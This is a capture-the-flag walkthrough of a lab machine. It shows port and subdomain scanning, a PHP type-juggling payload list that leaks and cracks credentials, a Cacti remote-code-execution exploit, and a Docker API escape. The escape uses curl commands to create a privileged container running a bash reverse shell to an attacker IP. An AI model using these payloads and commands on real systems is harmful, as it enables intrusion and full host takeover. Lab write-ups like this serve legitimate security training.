## Scanning
We start by scanning the machine, probing for ports. I use **`rustscan`** to make the probing of the ports faster, then it runs **`nmap`** after all ports are found and runs an **`nmap`** script.
```
 rustscan -a 10.129.7.152 -b 500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/m3m0rydmp/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.129.7.152:80
Open 10.129.7.152:5985
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-30 07:57 -0500
Initiating Ping Scan at 07:57
Scanning 10.129.7.152 [4 ports]
Completed Ping Scan at 07:57, 0.15s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 07:57
Scanning monitorsfour.htb (10.129.7.152) [2 ports]
Discovered open port 80/tcp on 10.129.7.152
Discovered open port 5985/tcp on 10.129.7.152
Completed SYN Stealth Scan at 07:57, 0.26s elapsed (2 total ports)
Nmap scan report for monitorsfour.htb (10.129.7.152)
Host is up, received echo-reply ttl 127 (0.14s latency).
Scanned at 2026-01-30 07:57:51 EST for 0s

PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 127
5985/tcp open  wsman   syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

We see that port 80 is open. If you try to visit that, the browser will return a DNS failure. Add something in `/etc/hosts`
```
<Machine IP>    monitorsfour.htb
```
## Web Enumeration
Upon accessing the landing page, there's a login page at the top right
![](assets/monitorsFour/Pasted%20image%2020260130210055.png)

There is no registration form, so we try to go to **forgot password**, upon sending an invalid email, the webpage says that it will send an email if the account is registered on the system.
![](assets/monitorsFour/Pasted%20image%2020260130210215.png)

We try to fuzz for directories and we found something interesting
![](assets/monitorsFour/Pasted%20image%2020260130210351.png)

Upon fuzzing, we will also see `.env` which consists of the following content. This is a rabbit hole as I did not get to use these.
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```
Apparently, this endpoint is responding so it is missing a token. We'll get back here later, we try to fuzz for subdomains.
```
ffuf -c -u 'http://monitorsfour.htb/' -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains/subdomains-top1million-20000.txt
```
We will have a result of cacti, so it will be `cacti.monitorsfour.htb` we will append this to our `/etc/hosts`
```
<Machine IP>    monitorsfour.htb cacti.monitorsfour.htb
```
We still have no creds in order to authenticate but the version of the cacti is interesting.
![](assets/monitorsFour/Pasted%20image%2020260130210833.png)
Let's go back to the user endpoint the we found earlier.

## Type Juggling
As I intercept the requests in `BurpSuite` I found an interesting thing in the response.
![](assets/monitorsFour/Pasted%20image%2020260130211105.png)
| PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like `0 == strcmp($_GET['username'], $password)` bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead.
![](assets/monitorsFour/Pasted%20image%2020260130211207.png)
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling#loose-comparison

In the user endpoint, try to put a random character in the token parameter. Notice that it says **`Invalid or Missing Token`** compared to the response earlier.
![](assets/monitorsFour/Pasted%20image%2020260130211439.png)
So we try to fuzz for a character that is compatible for the **php_loss_comparison**. Use this payload to try and fuzz which are the correct characters.
```
0
1
-1
0e1234
00
0x0
0x1
null
NULL

true
false
[]
{}
```

![](assets/monitorsFour/Pasted%20image%2020260130211703.png)
There are 3 characters that are valid to trick PHP. We then go back to the user endpoint then append 1 `php_loose_comparison` character in token parameter.
![](assets/monitorsFour/Pasted%20image%2020260130211851.png)
It reveals credentials especially the admin. After some observation, we notice that the password hashes are MD5. We try to crack it with hashcat. The plain text equivalent of the hash password for the user admin is:
`admin:wonderful1`
The name of the admin is `Marcus` we'll remember this. For now, we use this password to login on the webpage.
![](assets/monitorsFour/Pasted%20image%2020260130212041.png)
Unfortunately, we did not find anything here, so we go back to the **cacti** subdomain. If we login with `admin:wonderful1` it is incorrect. But if we try `marcus:wonderful1` we get an access.

# User
## CVE-2025-24367
As we noticed about the version of **Cacti** earlier. It is vulnerable to an RCE of [CVE-2025-24367](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC).
You can do more research about this CVE, but we'll skip to RCE now. The given link has a POC exploit already so we try to establish a foothold on the machine. **Make sure that you have a netcat listener already open**
![](assets/monitorsFour/Pasted%20image%2020260130212544.png)
Once a shell is established, you can get the user flag already.
![](assets/monitorsFour/Pasted%20image%2020260130212647.png)
# Root
If you're wondering why is this **Linux**, when this machine is **Windows**? We figure out that the current environment is running in docker. We enumerate this by looking inside `/etc/resolv.conf`
To understand the topology, we check the hostname resolution.
![](assets/monitorsFour/Pasted%20image%2020260130213337.png)
So, `mariadb` is not a global hostname, but a **Docker-Internal Service**. The resolved ip `172.18.0.3` sits on a Docker Bridge Network, which is `172.18.0.2`.
![](assets/monitorsFour/Pasted%20image%2020260130213557.png)
```
Container (Cacti) ---> 172.18.0.2
Docker (MariaDB) ---> 172.18.0.3
Bridge Gateway ---> 172.18.0.1
```
## Internal Scanning
We use the tool [fscan](https://github.com/shadow1ng/fscan/releases) to scan for open ports internall. We want to scan the Docker environment, this tool will also find for vulnerabilities if there are any.
![](assets/monitorsFour/Pasted%20image%2020260130213858.png)
We notice that the docker environment is vulnerable to an API unauthorized RCE. More info about the vulnerability here [When a SSRF is enough: Full Docker Escape on Windows Docker Desktop (CVE-2025-9074)](https://blog.qwertysecurity.com/Articles/blog3)

Basically, we will try to mount the whole WSL to `host_root`. 
**Port 2375** is the port for the API of the docker. We need to make a request there and try to get a reverse shell to our attacker machine. The commands `docker ps`, `docker run` sends a **`REST API`** calls to Docker.

We confirm for remote API Access with this command
```
www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/version
curl http://192.168.65.7:2375/version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   852    0   852    0     0  24933      0 --:--:-- --:--:-- --:--:-- 25058
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
```
Since we confirmed that we have access, we can now begin our privilege escalation. In an unpatched Docker Desktop for **Windows**, and container can:
* Connect to `192.168.65.7:2375` without authentication
* Sign up a **privileged container**
* Mount the whole **C:\ drive** into the system
* Execute commands with full access to Windows System

With this one liner command, we create a new privileged container, replace this with your own IP and port to establish a reverse shell.
```
curl -H 'Content-Type: application/json' \
  -d '{
    "Image": "docker_setup-nginx-php:latest",
    "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.1/9001 0>&1"],
    "HostConfig": {
      "Binds": ["/mnt/host/c:/host_root"]
    }
  }' \
  -o create.json \
  http://192.168.65.7:2375/containers/create
```
We then try to start this container
```
curl -d '' "http://192.168.65.7:2375/containers/1e4ee238bde1d95f84869b93fa56135253c1400592c5f7dc81a9464d38a2297c/start"
```
Then confirm if the reverse shell is working
```
curl -s "http://192.168.65.7:2375/containers/1e4ee238bde1d95f84869b93fa56135253c1400592c5f7dc81a9464d38a2297c/logs?stdout=1&stderr=1"
```
We can also see this in our reverse shell that we established.

![](assets/monitorsFour/Pasted%20image%2020260130214829.png)

We are now accessing the system as **`root`** and can do anything. This means we are inside a `WSL2` environment. The process we just did is to mount the whole system in `/host_root` through this, we can do lateral movement to the whole drive and get the **root flag** directly at `/host_root`
![](assets/monitorsFour/Pasted%20image%2020260130215022.png)
